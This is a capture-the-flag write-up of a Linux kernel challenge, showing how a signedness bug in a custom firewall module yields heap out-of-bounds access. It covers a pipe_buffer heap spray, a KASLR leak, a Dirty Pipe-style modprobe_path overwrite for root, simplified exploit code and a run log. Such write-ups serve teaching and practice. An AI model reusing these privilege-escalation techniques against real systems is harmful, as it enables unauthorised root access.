# throughthewall

**Category:** Pwn

## Description

> This wall is not very solid seemingly, can you get through it?
>
> `ncat --ssl throughthewall.opus4-7.b01le.rs 8443`

## Overview

A Linux kernel exploitation challenge running a custom `firewall.ko` kernel module on a QEMU VM (Linux 5.15.167, x86_64) with SMEP, SMAP, KASLR, and PTI enabled. The module manages firewall rules as kmalloc-1024 heap objects and exposes ioctl handlers with a signed/unsigned integer confusion bug in the bounds check, giving us a relative heap out-of-bounds read and write. We spray `pipe_buffer` arrays into adjacent slabs, leak the kernel base from `anon_pipe_buf_ops`, then perform a Dirty Pipe-style `modprobe_path` overwrite to escalate privileges and read the flag.

**Flag:** `bctf{spray_those_dirty_pipes}`

## Technical details

### Environment

- QEMU VM: Linux 5.15.167 x86_64, 256MB RAM, 2 CPUs
- Mitigations: SMEP, SMAP, KASLR, PTI
- Kernel module: `firewall.ko` loaded at boot, device at `/dev/firewall` (mode 666)
- User: `ctf` (uid=1000), flag at `/flag.txt` (root-only)

### The Vulnerability

The module manages up to 256 firewall rules, each a kmalloc-1024 (0x400 byte) heap object, and exposes four ioctl commands:

| Command | Code | Description |
|---|---|---|
| ADD_RULE | `0x41004601` | Allocate rule, parse from user string |
| DELETE_RULE | `0x40044602` | Free rule by index |
| EDIT_RULE | `0x44184603` | Write data at offset within rule |
| SHOW_RULE | `0x84184604` | Read data at offset within rule |

The EDIT and SHOW handlers accept a request struct:

```c
struct fw_edit_req {
    int32_t index;    // rule index (0-255)
    int32_t pad;
    int64_t offset;   // offset within rule buffer
    int64_t size;     // number of bytes
    char data[0x400]; // payload
};
```

The bounds check in both handlers:

```asm
lea    (%rax,%rdx,1), %rcx   ; rcx = offset + size
cmp    $0x400, %rcx           ; unsigned compare
ja     error
```

`offset` and `size` are signed 64-bit values, but the sum `offset + size` is checked against 0x400 using an **unsigned** comparison. If `offset` is negative (e.g., `-0x400 = 0xFFFFFFFFFFFFFC00`) and `size` is `0x400`:

```
offset + size = 0xFFFFFFFFFFFFFC00 + 0x400 = 0x0000000000000000 <= 0x400  (passes)
```

The actual memory access goes to `rules[idx] - 0x400` -- the **previous** slab object. This yields a relative heap OOB read and write of up to 0x400 bytes before any rule chunk.

### Exploitation Strategy

**Step 1 -- Heap spray layout:**

1. Allocate 128 firewall rules (fills kmalloc-1024 slab pages)
2. Free every other rule (creates holes)
3. Spray 64 `pipe_buffer` arrays via `pipe()` + one-byte write

`pipe_buffer` arrays on 5.15 are 16 entries x 40 bytes = 640 bytes, allocated from kmalloc-1024 (same slab). The freed slots get filled, creating interleaved adjacency:

```
[Rule 0] [pipe_buf A] [Rule 2] [pipe_buf B] [Rule 4] ...
```

**Step 2 -- Kernel base leak:**

Each `pipe_buffer` entry contains:

```c
struct pipe_buffer {
    struct page *page;                        // +0x00  (0xffffea00...)
    unsigned int offset;                      // +0x08
    unsigned int len;                         // +0x0c
    const struct pipe_buf_operations *ops;    // +0x10  (kernel .rodata ptr)
    unsigned int flags;                       // +0x18
    unsigned long private;                    // +0x20
};
```

We iterate over even-indexed rules and OOB-read at offset `-0x400` to scan the previous slab object. We identify `pipe_buffer` entries by signature:
- `page` pointer prefix `0xffffea` (vmemmap region)
- `ops` pointer prefix `0xffffff` (kernel text/rodata)

The `ops` pointer is `anon_pipe_buf_ops` at known offset `0x121ad80` from kernel base:

```
kernel_base = leaked_ops - 0x121ad80
```

**Step 3 -- Dirty Pipe-style modprobe_path overwrite:**

With kernel base known, compute the physical address of `modprobe_path` and its corresponding `struct page *`:

```
modprobe_path = kernel_base + 0x18518c0
phys_addr     = modprobe_path - 0xffffffff80000000   (phys_base = 0 on QEMU)
pfn           = phys_addr >> 12
page_struct   = 0xffffea0000000000 + pfn * 64
page_offset   = phys_addr & 0xfff
```

We corrupt the adjacent `pipe_buffer` entry via OOB write:

| Field | Value | Purpose |
|---|---|---|
| `page` | `page_struct` of modprobe_path's page | Redirect page target |
| `offset` | `page_offset` of modprobe_path | Write position within page |
| `len` | 0 | Reset length |
| `flags` | `PIPE_BUF_FLAG_CAN_MERGE (0x10)` | Allow direct write to page |
| `ops` | unchanged | Avoid crash |

Then write `"/tmp/x\0"` to all pipe write-fds. The pipe whose `pipe_buffer` was corrupted writes directly to the physical page containing `modprobe_path`, overwriting `/sbin/modprobe` with `/tmp/x`.

**Step 4 -- Trigger and profit:**

1. Create `/tmp/x`: a shell script that copies `/flag.txt` to `/tmp/flag` with world-readable permissions
2. Create `/tmp/bad`: a file with invalid magic bytes (`\xff\xff\xff\xff`)
3. Execute `/tmp/bad` -- kernel invokes `modprobe_path` (now `/tmp/x`) as root
4. Read `/tmp/flag`

### Key Offsets (Linux 5.15.167)

| Symbol | Offset from kernel base |
|---|---|
| `anon_pipe_buf_ops` | `0x121ad80` |
| `modprobe_path` | `0x18518c0` |
| `__START_KERNEL_map` | `0xffffffff80000000` |
| vmemmap base | `0xffffea0000000000` |

### Mitigations Bypassed

| Mitigation | How Bypassed |
|---|---|
| SMEP | No user-space code execution needed (data-only attack) |
| SMAP | No user-space data access from kernel needed |
| KASLR | Leaked kernel base from `anon_pipe_buf_ops` pointer in `pipe_buffer` |
| PTI | No impact on data-only attacks |

## Proof-of-Concept

The exploit is a freestanding C program (`exploit.c`) compiled with `gcc -nostdlib -static` using raw syscall wrappers, avoiding any libc dependency in the minimal initramfs:

```c
// Key exploit flow (simplified from exploit.c)

// Open the vulnerable device
fw_fd = sys_open("/dev/firewall", 2);

// Step 1: Heap spray -- allocate 128 rules, free every other one
for (int i = 0; i < 128; i++)
    rids[i] = add_rule("10.0.0.1 10.0.0.2 8000 1 r0");
for (int i = 1; i < 128; i += 2)
    delete_rule(rids[i]);

// Step 2: Fill holes with pipe_buffer arrays (kmalloc-1024)
for (int i = 0; i < 64; i++) {
    sys_pipe(pipes[i]);
    sys_write(pipes[i][1], "X", 1);
}

// Step 3: OOB read to find pipe_buffer and leak kernel base
for (int i = 0; i < 128; i += 2) {
    show_rule(rids[i], -0x400LL, 0x400, buf);   // read BEFORE the chunk
    // scan for pipe_buffer signature: page=0xffffea.., ops=0xffffff..
    // kernel_base = ops - 0x121ad80
}

// Step 4: Compute physical address of modprobe_path
modprobe_path = kbase + 0x18518c0;
phys = modprobe_path - 0xffffffff80000000ULL;
page_struct = 0xffffea0000000000ULL + (phys >> 12) * 64;

// Step 5: Corrupt pipe_buffer -> page to point at modprobe_path's page
edit_rule(vid, -0x400LL, 0x400, corrupted_buf);

// Step 6: Write "/tmp/x" through the corrupted pipe
sys_write(pipe_wr_fd, "/tmp/x\0", 7);

// Step 7: Trigger modprobe_path as root
sys_execve("/tmp/bad", ...);  // bad magic -> kernel runs /tmp/x as root

// Step 8: Read flag
sys_read(sys_open("/tmp/flag", 0), flagbuf, 256);
```

Remote deployment is handled by `exploit.py`, which connects via TLS, solves the PoW, uploads the gzip+base64-encoded binary via heredoc, and runs it:

```
$ python3 exploit.py
[*] Binary: 14120 bytes, compressed+b64: 5765 chars
[*] Connecting...
[*] Solving PoW...
[+] Got shell
[*] Running exploit...
rules=0x80
pipes=0x40
kbase=0xffffffff81000000
modprobe=0xffffffff998518c0
phys=0x198518c0
page_struct=0xffffea0006614600
page_off=0x8c0
[+] pipe_buffer corrupted
[+] wrote to pipes
[+] FLAG:
bctf{spray_those_dirty_pipes}
```

## P/S

This is a data-only kernel exploit -- no ROP chains, no code execution gadgets, no stack pivots. The entire attack stays within the kernel's existing data structures. The key insight is that `pipe_buffer` corruption gives you an arbitrary physical page write primitive (a manual Dirty Pipe), which is far simpler than trying to hijack control flow on a kernel with SMEP+SMAP+KASLR+PTI. The `modprobe_path` overwrite technique then converts an arbitrary kernel write into root code execution without ever touching instruction pointers.

The integer wrapping bug (`offset + size` checked unsigned while `offset` is signed) is a classic pattern in custom kernel drivers -- always verify that both operands of a bounds check are treated with consistent signedness.
